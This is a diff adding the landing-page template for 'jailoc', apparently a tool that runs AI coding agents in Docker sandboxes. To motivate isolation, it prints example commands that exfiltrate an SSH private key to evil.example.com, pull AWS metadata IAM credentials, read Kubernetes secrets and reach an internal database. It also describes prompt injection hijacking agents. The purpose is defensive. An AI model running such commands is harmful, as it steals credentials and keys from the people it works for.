@@ -1,0 +1,216 @@
+{% extends "main.html" %}
+
+{% block htmltitle %}
+<title>jailoc — Sandboxed environments for AI coding agents</title>
+{% endblock %}
+
+{% block content %}
+<div class="jl-landing md-typeset">
+
+  <!-- Hero -->
+  <section class="jl-hero">
+    <div class="md-grid">
+      <img src="{{ 'hero.jpeg' | url }}" alt="jailoc" />
+      <p class="jl-hero__tagline">
+        Isolated Docker environments for headless AI coding agents.
+        File restrictions, network isolation, privilege dropping — zero config to start.
+      </p>
+      <div class="jl-hero__actions">
+        <a href="{{ 'tutorials/getting-started/' | url }}" class="md-button md-button--primary">Get started</a>
+        <a href="{{ 'explanation/overview/' | url }}" class="md-button">How it works</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Horror stories -->
+  <section class="jl-horror">
+    <div class="md-grid">
+      <h2 class="jl-section__title">What your agent can reach — right now</h2>
+      <p class="jl-section__lead">
+        Without a sandbox, your coding agent inherits every permission your user account has.
+        It resolves internal DNS, reads your home directory, and talks to every endpoint
+        on your network. One prompt injection — hidden in a GitHub issue, a package README,
+        or a web page — and someone else is at the wheel.
+      </p>
+      <div class="jl-horror__grid">
+        <div class="jl-horror__card">
+          <div class="jl-horror__cmd">
+            <span class="jl-horror__prompt">$</span> psql -h production-db.internal -p 5432 -U app
+          </div>
+          <p>
+            Your production PostgreSQL at <code>10.0.35.18</code>. Customer records,
+            payment data, PII — the agent resolves internal DNS and connects
+            without any credentials beyond what's in your <code>.pgpass</code>.
+          </p>
+        </div>
+        <div class="jl-horror__card">
+          <div class="jl-horror__cmd">
+            <span class="jl-horror__prompt">$</span> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+          </div>
+          <p>
+            AWS metadata endpoint. One HTTP GET returns IAM credentials
+            with <code>s3:*</code>, <code>ec2:*</code>, <code>rds:*</code>.
+            Works from every EC2 instance. No auth required.
+          </p>
+        </div>
+        <div class="jl-horror__card">
+          <div class="jl-horror__cmd">
+            <span class="jl-horror__prompt">$</span> cat ~/.ssh/id_ed25519 | curl -d @- https://evil.example.com
+          </div>
+          <p>
+            Your SSH private key — the one that authenticates
+            to <code>gitlab.corp.internal</code> and every repo in the org.
+            Exfiltrated in one line.
+          </p>
+        </div>
+        <div class="jl-horror__card">
+          <div class="jl-horror__cmd">
+            <span class="jl-horror__prompt">$</span> curl -k https://k8s.internal:6443/api/v1/namespaces/prod/secrets
+          </div>
+          <p>
+            43 Kubernetes secrets in plaintext JSON: database connection strings,
+            Stripe API keys, JWT signing material. Your kubeconfig grants access.
+          </p>
+        </div>
+      </div>
+      <p class="jl-horror__kicker">
+        This isn't theoretical. Researchers have demonstrated prompt injection
+        exploits against GitHub Copilot, Microsoft 365 Copilot, Amazon Q,
+        Slack AI, and others.
+      </p>
+    </div>
+  </section>
+
+  <!-- Trifecta -->
+  <section class="jl-trifecta">
+    <div class="md-grid">
+      <h2 class="jl-section__title">The lethal trifecta</h2>
+      <p class="jl-section__lead">
+        An AI agent becomes exploitable when it combines three capabilities:
+        <strong>access to private data</strong>,
+        <strong>exposure to untrusted content</strong>, and
+        <strong>ability to communicate externally</strong>.
+        Any two are manageable. All three give an attacker a complete
+        exfiltration pipeline.
+      </p>
+      <p class="jl-trifecta__body">
+        jailoc cannot break the trifecta entirely — the agent still processes
+        untrusted content from the public internet, because that's its job.
+        What jailoc does is <strong>shrink the blast radius</strong> by
+        tightening the other two legs.
+      </p>
+      <p class="jl-trifecta__credit">
+        Based on Simon Willison's
+        <a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">The lethal trifecta for AI agents</a>.
+        Read the full <a href="{{ 'explanation/threat-model/' | url }}">Threat Model</a>.
+      </p>
+    </div>
+  </section>
+
+  <!-- Three pillars -->
+  <section class="jl-pillars">
+    <div class="md-grid">
+      <h2 class="jl-section__title">Three layers of isolation</h2>
+      <div class="jl-pillars__grid">
+        <div class="jl-pillar">
+          <div class="jl-pillar__icon">/</div>
+          <h3>File isolation</h3>
+          <p>
+            The agent only sees directories you explicitly mount as workspaces.
+            SSH keys, browser profiles, credentials, other projects — invisible
+            inside the container. Runs as UID 1000 with all Linux capabilities
+            dropped and <code>no_new_privs</code> set.
+          </p>
+        </div>
+        <div class="jl-pillar">
+          <div class="jl-pillar__icon">⟷</div>
+          <h3>Network isolation</h3>
+          <p>
+            Private networks (RFC 1918, link-local, CGNAT) blocked by iptables.
+            Your Kubernetes clusters, databases, and cloud metadata endpoints
+            are unreachable. You allowlist only what the agent needs.
+          </p>
+        </div>
+        <div class="jl-pillar">
+          <div class="jl-pillar__icon">⬡</div>
+          <h3>Docker isolation</h3>
+          <p>
+            Each workspace gets its own Docker daemon via a DinD sidecar.
+            No host socket mounting, no container breakout to the host.
+            Agent-started containers stay inside the sandbox.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Warning -->
+  <section class="jl-warning">
+    <div class="md-grid">
+      <div class="admonition warning">
+        <p class="admonition-title">What jailoc does not protect against</p>
+        <p>
+          The agent can still make outbound requests to the <strong>public
+          internet</strong>. If a prompt injection instructs the agent to
+          exfiltrate workspace source code to an attacker-controlled server,
+          jailoc's network rules will not block it. jailoc protects your
+          internal infrastructure and limits file access — it is not a
+          complete defense against the
+          <a href="{{ 'explanation/threat-model/' | url }}">lethal trifecta</a>.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Docs hub -->
+  <section class="jl-docs">
+    <div class="md-grid">
+      <h2 class="jl-section__title">Documentation</h2>
+      <div class="jl-docs__grid">
+        <div class="jl-docs__section">
+          <h3>Get started</h3>
+          <p>New to jailoc? Run your first workspace in minutes.</p>
+          <ul>
+            <li><a href="{{ 'tutorials/getting-started/' | url }}">Getting Started</a></li>
+          </ul>
+        </div>
+        <div class="jl-docs__section">
+          <h3>How-to guides</h3>
+          <p>Step-by-step guides for specific tasks.</p>
+          <ul>
+            <li><a href="{{ 'how-to/installation/' | url }}">Installation</a></li>
+            <li><a href="{{ 'how-to/workspace-configuration/' | url }}">Workspace Configuration</a></li>
+            <li><a href="{{ 'how-to/custom-images/' | url }}">Custom Images</a></li>
+            <li><a href="{{ 'how-to/network-access/' | url }}">Network Access</a></li>
+            <li><a href="{{ 'how-to/ssh-git-passthrough/' | url }}">SSH &amp; Git Passthrough</a></li>
+            <li><a href="{{ 'how-to/access-modes/' | url }}">Access Modes</a></li>
+          </ul>
+        </div>
+        <div class="jl-docs__section">
+          <h3>Reference</h3>
+          <p>Complete technical descriptions.</p>
+          <ul>
+            <li><a href="{{ 'reference/cli/' | url }}">CLI Reference</a></li>
+            <li><a href="{{ 'reference/configuration/' | url }}">Configuration Reference</a></li>
+            <li><a href="{{ 'reference/image-resolution/' | url }}">Image Resolution</a></li>
+            <li><a href="{{ 'reference/default-image/' | url }}">Default Image Contents</a></li>
+            <li><a href="{{ 'reference/overlay-compatibility/' | url }}">Overlay Compatibility</a></li>
+          </ul>
+        </div>
+        <div class="jl-docs__section">
+          <h3>Explanation</h3>
+          <p>Background on how and why.</p>
+          <ul>
+            <li><a href="{{ 'explanation/overview/' | url }}">Overview</a></li>
+            <li><a href="{{ 'explanation/threat-model/' | url }}">Threat Model</a></li>
+            <li><a href="{{ 'explanation/container-architecture/' | url }}">Container Architecture</a></li>
+            <li><a href="{{ 'explanation/network-isolation/' | url }}">Network Isolation</a></li>
+            <li><a href="{{ 'explanation/access-modes/' | url }}">Access Modes</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+{% endblock %}
